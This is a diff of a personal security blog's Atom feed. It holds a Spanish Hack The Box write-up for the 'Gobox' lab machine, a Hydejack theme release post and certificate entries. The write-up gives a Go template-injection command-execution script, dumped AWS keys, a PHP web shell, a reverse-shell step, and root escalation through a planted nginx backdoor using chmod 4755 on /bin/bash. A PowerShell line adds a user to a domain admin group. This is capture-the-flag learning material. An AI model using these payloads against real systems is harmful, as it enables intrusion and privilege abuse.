 Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span>Set-Content C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\p</span>wned.bat <span class="nt">-Value</span> <span class="s1">'net group Site_Admin awallace /domain /add'</span><span class="o">}</span>
-</code></pre></div></div>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">CPTS</title><link href="http://localhost:4000/blog/certificates/2023-07-14-cpts/" rel="alternate" type="text/html" title="CPTS" /><published>2023-07-14T00:00:00-06:00</published><updated>2023-07-14T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/cpts</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2023-07-14-cpts/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">PNPT</title><link href="http://localhost:4000/blog/certificates/2023-06-01-pnpt/" rel="alternate" type="text/html" title="PNPT" /><published>2023-06-01T00:00:00-06:00</published><updated>2023-06-01T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/pnpt</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2023-06-01-pnpt/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/PNPT.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/PNPT.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Gobox</title><link href="http://localhost:4000/blog/machines/2022-09-29-gobox/" rel="alternate" type="text/html" title="Gobox" /><published>2022-09-29T00:00:00-05:00</published><updated>2022-09-29T00:00:00-05:00</updated><id>http://localhost:4000/blog/machines/gobox</id><content type="html" xml:base="http://localhost:4000/blog/machines/2022-09-29-gobox/"><![CDATA[<p>Vemos el puerto 80 y 8080, donde en el puerto 80 no encontramos nada interesante pero en el 8080 encontramos un login.</p>
-
-<p><img src="/assets/img/machines/gobox/gobox.png" alt="imagen1" /></p>
-
-<p><img src="/assets/img/machines/gobox/gobox2.png" alt="imagen2" />
-En este punto vemos por medio de burpsuite que estamos en un servidor golang e intentamos un ssti.</p>
-
-<p><img src="/assets/img/machines/gobox/gobox3.png" alt="imagen3" /></p>
-
-<p><img src="/assets/img/machines/gobox/gobox4.png" alt="imagen4" /></p>
-
-<p>Con un “{{ . }}” obtenemos un correo y una contraseña por lo que lo usamos en el login y dentro encontramos una función que nos permite mediante el input inyectar comandos.</p>
-
-<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">u</span> <span class="n">User</span><span class="p">)</span> <span class="n">DebugCmd</span> <span class="p">(</span><span class="n">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
-  <span class="n">ipp</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="s">" "</span><span class="p">)</span>
-  <span class="n">bin</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="o">:</span><span class="m">1</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
-  <span class="n">args</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="m">1</span><span class="o">:</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
-  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">{</span>
-    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
-    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
-  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
-    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>Por el ssti nos permite llamar a objetos y funciones internas del código existente, por lo que pegamos la función y el comando para ejecutar comandos.</p>
-
-<p><img src="/assets/img/machines/gobox/gobox5.png" alt="imagen5" /></p>
-
-<p>En este punto para práctica nos montamos un script en python para poder ejecutar comandos más facilmente.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span>
-
-<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Saliendo...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-
-<span class="c1">#Variables Globales
-</span><span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.11.113:8080/forgot/"</span>
-
-<span class="c1">#CTRL+C
-</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">makerequest</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
-    <span class="n">data_post</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="s">'email'</span><span class="p">:</span><span class="s">"test@{\{ .DebugCmd "</span> <span class="o">%</span><span class="n">s</span> <span class="s">" }\}"</span> <span class="o">%</span> <span class="n">command</span>
-    <span class="p">}</span>
-    
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data_post</span><span class="p">)</span>
-
-    <span class="n">output</span> <span class="o">=</span> <span class="p">((</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'Email Sent To:(.*)\s+&lt;button class'</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">))[</span><span class="mi">0</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">             "</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="s">"test@"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>
-
-    <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
-    
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
-        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
-        <span class="n">makerequest</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>      
-
-</code></pre></div></div>
-
-<p>Al hacer un <code class="language-plaintext highlighter-rouge">hostname -i</code> vemos que se llama <code class="language-plaintext highlighter-rouge">aws</code> por lo que procedemo a aplicar comando en aws. Nos encontramos credenciales en <code class="language-plaintext highlighter-rouge">.aws</code> y en <code class="language-plaintext highlighter-rouge">env</code> para que podamos conectarnos en nuestra máquina.</p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nb">cat</span> ~/.aws/credentials
- <span class="o">[</span>default]
-<span class="nv">aws_access_key_id</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
-<span class="nv">aws_secret_access_key</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
-
-<span class="o">&gt;</span><span class="nb">env
- </span><span class="nv">HOSTNAME</span><span class="o">=</span>aws
-<span class="nv">PWD</span><span class="o">=</span>/opt/uhc
-<span class="nv">HOME</span><span class="o">=</span>/root
-<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
-<span class="nv">SHLVL</span><span class="o">=</span>0
-<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
-<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-<span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
-</code></pre></div></div>
-
-<p>Nos conectamos desde nuestra máquina</p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>aws s3 <span class="nb">ls
- </span>2022-09-30 05:32:15 website
-
-<span class="o">&gt;</span>aws s3 <span class="nb">ls </span>s3://website
-                            PRE css/
-2022-09-30 05:32:16    1294778 bottom.png
-2022-09-30 05:32:15     165551 header.png
-2022-09-30 05:32:15          5 index.html
-2022-09-30 05:32:15       1803 index.php
-</code></pre></div></div>
-
-<p>Dentro de index.html vemos que dice test y yendo hacia la página principal y poniendo index.html nos pone test, por lo que podríamos subir un archivo para ejecutar comando en php.</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span> <span class="s2">"&lt;pre&gt; .  shell_exec(</span><span class="nv">$_REQUEST['cmd']</span><span class="s2">) . "</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span><span class="p">;</span>
-</code></pre></div></div>
-
-<p>Mediante <code class="language-plaintext highlighter-rouge">base64</code> nos pasamos el contenido lo ponemos en la máquina víctima.</p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>aws s3 <span class="nb">cp</span> /tmp/reverse.php s3://website/reverse.php
-upload: ../../tmp/reverse.php to s3://website/reverse.php
-</code></pre></div></div>
-
-<p><img src="/assets/img/machines/gobox/gobox6.png" alt="imagen6" /></p>
-
-<p>Nos entablamos una reverse shell y estamos dentro.</p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">ls
-</span>50-backdoor.conf	      50-mod-http-xslt-filter.conf  50-mod-stream.conf
-50-mod-http-image-filter.conf  50-mod-mail.conf
-www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">cat </span>50-backdoor.conf 
-load_module modules/ngx_http_execute_module.so<span class="p">;</span>
-www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>find / <span class="nt">-name</span> ngx_http_execute_module.so 2&gt;/dev/null
-/usr/lib/nginx/modules/ngx_http_execute_module.so
-www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>strings /usr/lib/nginx/modules/ngx_http_execute_module.so | <span class="nb">grep</span> <span class="s2">".run"</span>
-ippsec.run
-</code></pre></div></div>
-<p>Vemos que la máquina había sido vulnerada antes, y tiene un archivo <code class="language-plaintext highlighter-rouge">ngx_http_execute_module.so</code> buscando en google se ve que se puede ejecutar comandos con curl, pero al hacer un strings al archivo
-observamos que hay un <code class="language-plaintext highlighter-rouge">ippsec.run</code> que sustituye al system.run en curl.</p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>curl <span class="s1">'http://localhost:8000/?ippsec.run[whoami]'</span>
-root
-www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>curl <span class="s2">"http://localhost:8000/?ippsec.run[chmod%204755%20%2fbin%2fbash]"</span>
-curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
-www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
-<span class="nt">-rwsr-xr-x</span> 1 root root 1183448 Jun 18  2020 /bin/bash
-</code></pre></div></div>
-<p>Hacemos un bash -p y estamos dentro como root.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="machines" /><category term="htb" /><summary type="html"><![CDATA[Vemos el puerto 80 y 8080, donde en el puerto 80 no encontramos nada interesante pero en el 8080 encontramos un login.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/axlle/axlle1.JPG" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/axlle/axlle1.JPG" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">What’s New in Hydejack 9.1?</title><link href="http://localhost:4000/blog/example/2021-02-13-whats-new-in-hydejack-9-1/" rel="alternate" type="text/html" title="What’s New in Hydejack 9.1?" /><published>2021-02-13T00:00:00-06:00</published><updated>2021-02-13T00:00:00-06:00</updated><id>http://localhost:4000/blog/example/whats-new-in-hydejack-9-1</id><content type="html" xml:base="http://localhost:4000/blog/example/2021-02-13-whats-new-in-hydejack-9-1/"><![CDATA[<p>What’s New in Hydejack 9.1?</p>
-
-<ul id="markdown-toc">
-  <li><a href="#stripe-ified-design" id="markdown-toc-stripe-ified-design">Stripe-ified Design</a></li>
-  <li><a href="#inverted-sidebars" id="markdown-toc-inverted-sidebars">Inverted Sidebars</a></li>
-  <li><a href="#code-block-headers" id="markdown-toc-code-block-headers">Code Block Headers</a></li>
-  <li><a href="#resume-download-buttons" id="markdown-toc-resume-download-buttons">Resume Download Buttons</a></li>
-  <li><a href="#serp-breadcrumbs" id="markdown-toc-serp-breadcrumbs"><abbr title="Search Engine Results Page">SERP</abbr> Breadcrumbs</a></li>
-  <li><a href="#last-modified-at" id="markdown-toc-last-modified-at">Last Modified At</a></li>
-  <li><a href="#clap-button-preview" id="markdown-toc-clap-button-preview">Clap Button Preview</a></li>
-  <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
-</ul>
-
-<h2 id="stripe-ified-design">Stripe-ified Design</h2>
-<p>Most elements now have rounded borders, making the design look more modern (dare I say “Stripe-ified”) than ever before.</p>
-
-<p>The goal of Hydejack was always to provide a theme that looks “designed” combined the amenities of a typical Jekyll theme for coders.
-This is an important step in maintaining this goal.</p>
-
-<p>At the same time, I’m introducing nerdy elements like <a href="#serp-breadcrumbs">breadcrumbs</a>, that are almost ornamental in nature.
-You wouldn’t find these on other Stripe-like designs, but I think they are appealing to developer types like myself. 
-Like most additions to Hydejack, they can be disabled via configuration.</p>
-
-<h2 id="inverted-sidebars">Inverted Sidebars</h2>
-<p>The colors on the sidebar can now be inverted to allow brighter sidebar images. This can be enabled per-page in the fort matter:</p>
-
-<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">invert_sidebar</span><span class="pi">:</span> <span class="no">true</span>
-</code></pre></div></div>
-
-<h2 id="code-block-headers">Code Block Headers</h2>
-<p>Code blocks can now have headers:</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// file: 'hello-world.js'</span>
-<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello World!</span><span class="dl">'</span><span class="p">);</span>
-</code></pre></div></div>
-
-<p>Headers are added by making the first line a comment of the form <code class="language-plaintext highlighter-rouge">(file|title): ['"].*['"]</code>, e.g.:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~~~js
-// file: 'hello-world.js'
-console.log('Hello World!');
-~~~
-</code></pre></div></div>
-
-<p>Code blocks with and without headers now also come with a copy button. 
-In the case of header-less code blocks, the button only shows on hover to prevent potential overlap.</p>
-
-<h2 id="resume-download-buttons">Resume Download Buttons</h2>
-<p>Resumes can now have download buttons:</p>
-
-<p><img src="/assets/img/blog/9.1.0-3.png" alt="Download Buttons" class="border lead" width="1776" height="258" loading="lazy" /></p>
-
-<p class="figcaption">Resumes can now have download buttons.</p>
-
-<p>The documentation has been updated with a chapter on <a href="/docs/basics/#downloads">how to configure the buttons</a>.</p>
-
-<h2 id="serp-breadcrumbs"><abbr title="Search Engine Results Page">SERP</abbr> Breadcrumbs</h2>
-<p>Added breadcrumbs above page title:</p>
-
-<p><img src="/assets/img/blog/9.1.0-2.png" alt="Breadcrumbs" class="border lead" width="1588" height="164" loading="lazy" /></p>
-
-<p class="figcaption">Bread crumbs are now shown above each page title.</p>
-
-<p>Note that this requires a <a href="https://qwtel.com/posts/software/urls-are-directories/">directory-like URL structure</a> on your entire site, 
-otherwise the intermediate links will point to nonexisting sites.</p>
-
-<p>On a side note, Hydejack now has built-in tooltips for abbreviations like <abbr title="Search Engine Results Page">SERP</abbr> (activated via tap/click).
-See <a href="/blog/hyde/2012-02-07-example-content/#inline-html-elements">Example Content</a> on how to add them to your content.</p>
-
-<h2 id="last-modified-at">Last Modified At</h2>
-<p>Blog posts can now have a “last modified at” date in the sub title row.</p>
-
-<p><img src="/assets/img/blog/9.1.0-1.png" alt="Last modified at" class="border lead" width="1254" height="218" loading="lazy" /></p>
-
-<p>Note that this depends on the <code class="language-plaintext highlighter-rouge">last_modified_at</code> property of the page, which must be either set manually in the frontmatter (not recommended), or via a plugin like <a href="https://github.com/gjtorikian/jekyll-last-modified-at"><code class="language-plaintext highlighter-rouge">jekyll-last-modified-at</code></a>. Note that the later is not available when building on GitHub Pages and can increase build times.</p>
-
-<h2 id="clap-button-preview">Clap Button Preview</h2>
-<p>I’ve been trying something new with <a href="https://getclaps.app/"><strong>getclaps.app</strong></a>, a feedback and analytics tool for personal sites like those powered by Hydejack.</p>
-
-<!-- <clap-button style="--clap-button-color:var(--body-color);margin:2rem auto 3rem;width:3rem;height:3rem;font-size:smaller" nowave></clap-button> -->
-
-<p>It is a separate product from Hydejack and not enabled by default. Because it depends on a backend component, it requires a monthly fee. 
-If enabled, it is placed below posts and pages where the dingbat character (❖) used to be.</p>
-
-<p>I can’t claim that this product is fully baked (feedback welcome), but I’ve been using it on my personal site and here for the last couple of months with no issues.
-For more, see <a href="https://getclaps.app/">the dedicated website</a>.</p>
-
-<hr style="margin:2rem 0" />
-
-<p>There are many more changes and bugfixes in 9.1. See the <a href="/CHANGELOG/" class="heading flip-title">CHANGELOG</a> for details.</p>
-
-<h2 id="credits">Credits</h2>
-
-<p><span>Photo by <a href="https://unsplash.com/@jjying?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">JJ Ying</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+</code></pre></div></div>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">CPTS</title><link href="http://localhost:4000/blog/certificates/2023-07-14-cpts/" rel="alternate" type="text/html" title="CPTS" /><published>2023-07-14T00:00:00-06:00</published><updated>2023-07-14T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/cpts</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2023-07-14-cpts/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
